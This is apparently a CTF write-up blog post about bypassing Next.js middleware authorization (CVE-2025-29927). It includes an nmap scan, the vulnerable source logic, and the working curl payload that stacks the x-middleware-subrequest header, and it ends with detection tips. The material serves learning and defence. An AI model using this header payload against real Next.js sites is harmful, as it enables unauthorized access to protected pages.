---
title: "CTF Writeup: The Next.js Middleware Phantom"
date: 2026-02-01 20:30:00 +0500
categories: [CTF, Web]
tags: [nextjs, cve-2025-29927, auth-bypass, red-team, reconnaissance]
---

# CTF Writeup: Next.js Middleware Auth Bypass (CVE-2025-29927)
**Difficulty:** Hard | **Platform:** Local Server | **Date:** January 2025

# 1. Executive Summary
This report documents the grueling process of exploiting CVE-2025-29927 in a recent CTF. The challenge involved a modern Next.js 15.2.2 application where the primary security gate—the middleware—could be tricked into skipping its authorization checks via a crafted x-middleware-subrequest header. Success was only achieved after overcoming severe network instability and a steep learning curve regarding Next.js internals.

# 2. Reconnaissance & Enumeration: The Struggle for Clarity
## 2.1. Unstable Ground (Network Challenges)
The engagement started with a massive hurdle: high latency and consistent server failures. Standard scans were timing out, making the target appear down when it was actually just struggling under the load.

The Lesson: My initial nmap scans failed because I didn't account for the environment. I had to slow down my timing (-T2) and increase retries.

Command:

Bash
nmap -sV -p 3000 --max-retries 5 --host-timeout 30m [Target_IP]
## 2.2. Identifying the Stack
Once the connection stabilized, I identified the app was running on Next.js.

Response Header: X-Powered-By: Next.js

Static Assets: Found /_next/static in the page source.

## 2.3. The Failure of Generic Attacks
I wasted roughly two hours directory-busting with standard wordlists like common.txt. I found /login and /dashboard, but my lack of experience with modern JS frameworks led me into a "tunnel vision" trap: I spent far too long trying to find SQLi or JWT flaws in a stack that doesn't use traditional session patterns.

# 3. Vulnerability Analysis: Understanding the "Bouncer"
## 3.1. The "Aha!" Moment
After failing with traditional methods, I pivoted to framework-specific research. I discovered that Next.js uses an internal header, x-middleware-subrequest, to prevent infinite loops. If the framework thinks it's already in a sub-request, it skips the middleware entirely.

## 3.2. The Logic Flaw
In the vulnerable Next.js source code, the runMiddleware function blindly trusts this header:

JavaScript
const subreq = params.request.headers["x-middleware-subrequest"];
const subrequests = typeof subreq === "string" ? subreq.split(":") : [];

if (subrequests.includes(middlewareInfo.name)) {
  // If my name is here, I must have already run. Skipping!
  return NextResponse.next(); 
}

# 4. Exploitation: Cracking the Code
## 4.1. The Payload Evolution
Because the app was Next.js 15.x, a simple middleware value wasn't enough due to a MAX_RECURSION_DEPTH of 5. I had to satisfy the check multiple times.

Failed Attempt 1:

Bash
curl -H "x-middleware-subrequest: middleware" http://[REDACTED]:3000/dashboard
# Result: 307 Redirect to /login
Failed Attempt 2 (Network Failure): The server timed out mid-exploit. I thought the payload was wrong, but it was actually a server crash. I had to wait for the reset.

## 4.2. The Final Blow (Success)
I stacked the payload to bypass the recursion check. By repeating the internal middleware name, I tricked the framework into thinking it had already looped 5 times.

Command:

Bash
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://[REDACTED]:3000/dashboard
Result: HTTP/1.1 200 OK. The middleware "bouncer" stepped aside, and the dashboard (along with the flag) was served directly to my terminal.

# 5. Post-Exploitation & Detection (SOC Perspective)
As an aspiring SOC analyst, I realized how loud this attack is. A simple Nuclei template can automate this, but from a defensive side, we should look for:

Any external requests containing x-middleware-* headers.

High-frequency access to protected routes returning 200 OK without a session cookie.

# Conclusion
This CTF was a lesson in persistence. Between the server outages and my own initial lack of experience with Next.js headers, it would have been easy to quit. But by digging into the framework internals and stabilizing my recon process, I turned a "failed" engagement into a success.
